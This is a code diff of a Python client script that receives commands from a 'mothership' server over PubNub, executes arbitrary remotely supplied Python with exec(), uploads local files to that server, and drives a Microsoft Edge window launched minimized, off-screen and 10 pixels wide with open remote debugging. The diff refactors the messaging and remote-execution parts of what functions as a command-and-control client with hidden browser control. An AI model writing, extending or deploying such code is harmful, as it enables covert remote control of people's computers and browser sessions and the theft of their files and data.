@@ -60,6 +60,15 @@ def gettimestamp():
 
     return timestamp
 
+def serialize_exception(exc: Exception):
+
+    exc_data = {
+        "error_type": type(exc).__name__,
+        "message": str(exc),
+        "traceback": traceback.format_exception(type(exc), exc, exc.__traceback__)
+    }
+    return json.dumps(exc_data)
+
 def getexceptionobj(exp):
     expstrdict = {
         "msg": str(exp),
@@ -102,31 +111,6 @@ def get_mothership():
 
     return tmothership
 
-def connect_client(tclientid):
-    try:
-        url = f"{mothership}/ow/relay.php?action=connectclient&clientid={tclientid}"
-        response = requests.get(url)
-        
-        #{ "SessionID": "67363438" }
-        
-        if ( response ):
-            if ( not isempty(response.text) ):
-                logmsg(f"response.text: {response.text}")
-                
-                obj_dict = json.loads(response.text)
-            
-                if obj_dict and "SessionID" in obj_dict:
-                    return obj_dict["SessionID"]
-            else:
-                logmsg("error: response.text is empty")
-                return None
-        else:
-            logmsg("error: response is null")
-            return None
-    except Exception as exp:
-        logexception(exp)
-        return None
-        
 def send_rpc_command(url, command, log=True):
     result = None
     try:
@@ -161,11 +145,11 @@ def upload_file(filepath):
     fname = Path(filepath).name
 
     url = f"{mothership}/ow/upload.php?"
-    url += f"batchid={batchid}"
+    url += f"jobcode={jobcode}"
     url += f"&filename={fname}"
     url += f"&clientid={clientid}"
     url += f"&source={source}"
-    url += f"&sessionid={sessionid}"
+
     with open(fpath, 'rb') as f:
         response = requests.post(url, data=f)
 
@@ -181,57 +165,13 @@ def upload_txt(txtstr, fname):
     if ( os.path.exists(fpath) ):
         upload_file(fpath)
 
-def clientgetnextmessage():
-    logmsg("starting: " + inspect.currentframe().f_code.co_name)
-
-    url = f"{mothership}/ow/relay.php?"
-    url += "action=clientgetnextmessage"
-    url += f"&sessionid={relaysessionid}&clientid={clientid}"
-    
-    response = requests.get(url)
-    logmsg("response.status_code: " + str(response.status_code))  # e.g., 200 for success
-
-    logmsg(inspect.currentframe().f_code.co_name + ": " +response.text)
-
-    if "TRY_AGAIN" in response.text:
-        return response.text
-
-    obj_dict = json.loads(response.text)
-
-    return obj_dict
-
 def clientpushmessage(payload, messageid):
     logmsg("starting "+inspect.currentframe().f_code.co_name)
 
     if not payload:
         return None
     
-    #msgstr = json.dumps(payload)
-
-    #url = f"{mothership}/ow/relay.php?"
-    #url += f"action=clientpushmessage"
-    #url += f"&clientid={clientid}&sessionid={relaysessionid}&messageid={messageid}"
-    
-    #response = requests.post(url, data=msgstr.encode('utf-8'), headers={'Content-Type': 'application/json'})
     return publish_msg(payload, messageid)
-    #return response
-
-def wait_clientgetnextmessage(secs=1):
-    result = None
-    while True:
-        result = clientgetnextmessage()
-        msg_str = ""
-        if ( isinstance(result, str) ):
-            msg_str = result.strip()
-
-            if ( msg_str== "TRY_AGAIN" ):
-                result = None
-                logmsg(inspect.currentframe().f_code.co_name + " sleeping for " + str(secs) + " seconds")
-                time.sleep(secs)
-        else:
-            break
-
-    return result
 
 def exec_builtin(tcmdname, payload=""):
 
@@ -255,15 +195,22 @@ def exec_builtin(tcmdname, payload=""):
     elif ( tcmdname == "eval_code"):
         try:
             result = eval_code(payload)
-            # anchor
         except Exception as exp:
             logexception(exp)
-            result = None
+            result = { "iserror": True, "error": serialize_exception(exp) }
 
     result = { "result": result }
 
     return json.dumps(result)
 
+# message:
+#   MessageID
+#   payload
+#   builtincmd
+#   ws_url
+#   payload
+# result:
+#   messageid
 def client_loop(message):
     logmsg("client_loop: starting "+inspect.currentframe().f_code.co_name)
 
@@ -279,7 +226,7 @@ def client_loop(message):
         logmsg(f"client_loop: processing builtincmd {builtincmd}")
         
         if ( not isempty(builtincmd) ):
-            result = exec_builtin(builtincmd, payload)
+            result = exec_builtin(builtincmd, payload) # result should be object, send directly back to host
             
     else:
     
@@ -290,7 +237,7 @@ def client_loop(message):
         if not "payload" in message_obj:
             logmsg("payload key not in message_obj")
             return
-            
+
         ws_url = message_obj["ws_url"]
         
         payload = message_obj["payload"]
@@ -304,7 +251,7 @@ def client_loop(message):
         result = send_rpc_command(ws_url, payload,True)
     
     if ( result ):
-        data_dict = json.loads(result)
+        data_dict = json.loads(result) # result string returned from exec_builtin
         result = data_dict["result"]
         
         if ( result == {} ):
@@ -367,41 +314,44 @@ def start_msedge(starturl="https://www.google.com/", edgeport=9222):
     cmdlineargs = '--new-window '+starturl+' --profile-directory=Default --remote-debugging-port='+str(edgeport)+' --remote-allow-origins=* --restore-last-session --window-position=2000,2000 --window-size=10,10'
     os.system("start /min msedge " + cmdlineargs)
 
-def exec_payload(payload, context, local_vars):
-    if ( isempty(payload) ): # anchor
-        return;
+def exec_payload(payload, context):
+    
+    if ( isempty(payload) ):
+        return
 
     f_stdout = io.StringIO()
     f_stderr = io.StringIO()
+    excp = None
 
     with redirect_stdout(f_stdout), redirect_stderr(f_stderr):
         try:
-            exec(payload, context, local_vars)
-            local_vars = {k: v for k, v in local_vars.items() if isinstance(v, str)}
-
-            return f_stdout, f_stderr
+            exec(payload, context)
         except Exception as e:
-            traceback.print_exc()
+            excp = e
 
-global_context = {}
+        return f_stdout, f_stderr, excp
+
+execution_scope = {"__builtins__": __builtins__}
 def eval_code(payload):
-    local_vars = {}
-    global global_context
-    f_stdout, f_stderr = exec_payload(payload, {}, local_vars)
-
+    
+    if isempty(payload):
+        return None
+    
+    global execution_scope
     try:
-        json_result = json.dumps(local_vars, default=lambda x: None)
+        f_stdout, f_stderr, excp = exec_payload(payload, execution_scope)
     except Exception as e:
         logmsg(e)
-        json_result = None
+
 
     result = {
+        "line": payload,
         "stdout": f_stdout.getvalue() if f_stdout else "",
         "stderr": f_stderr.getvalue() if f_stderr else "",
-        "json_result": json_result
+        "error": excp,
     }
 
-    logmsg('eval_code result='+json.dumps(result))
+    logmsg('result='+json.dumps(result))
 
     return result
 
@@ -422,7 +372,7 @@ configfpath = ""
 if ( len(sys.argv) >= 2 ):
     configfpath = sys.argv[1] 
 
-config = { "browser":"msedge", "batchid":str(random.randint(10000000, 99999999)) }
+config = { "browser":"msedge", "jobcode":str(random.randint(10000000, 99999999)) }
 
 try:
     if not isempty(configfpath) and os.path.isfile(configfpath):
@@ -453,7 +403,7 @@ logfname = script_fname + "_" + timestamp + ".log"
 logfpath = os.path.join(scriptdir_full_path, logfname)
 logf = open(logfpath, 'w', encoding='utf-8')
 
-batchid = config['batchid']
+jobcode = config['jobcode']
 clientid = get_clientid()
 mothership = get_mothership()
 
@@ -465,7 +415,7 @@ if ( isempty(clientid) ):
     logmsg("could not set clientid -- exiting")
     sys.exit(1)
 
-logmsg(f"starting script {script_fname} clientid {clientid} batchid {batchid} debugport {debugport} -- args: " + ' '.join(sys.argv[1:]) + f" -- {timestamp}")
+logmsg(f"starting script {script_fname} clientid {clientid} jobcode {jobcode} debugport {debugport} -- args: " + ' '.join(sys.argv[1:]) + f" -- {timestamp}")
 
 ###
 
@@ -490,6 +440,11 @@ def publish_callback(result, status):
     else:
         logmsg(f"pubnub: Publish failed with status: {status.category}")
 
+# sends msgobject to client_channel:
+#   payload
+#   MessageID
+# result
+#   ???
 def publish_msg(msgdict, messageid):
 
     if not msgdict:
@@ -503,14 +458,12 @@ def publish_msg(msgdict, messageid):
     result = pubnub.publish().channel(client_channel).message(msgobjout).pn_async(publish_callback)
     return result
 
-# pubnub.publish().channel(mothership_channel).message(my_message).pn_async(publish_callback)
-
 # incomming messages
 def handle_message(message_event):
     pp = inspect.currentframe().f_code.co_name
 
     if not message_event:
-        return;
+        return
 
     logmsg(f"pubnub: {pp} received message_event on channel [{message_event.channel}]: {message_event.message}")
 
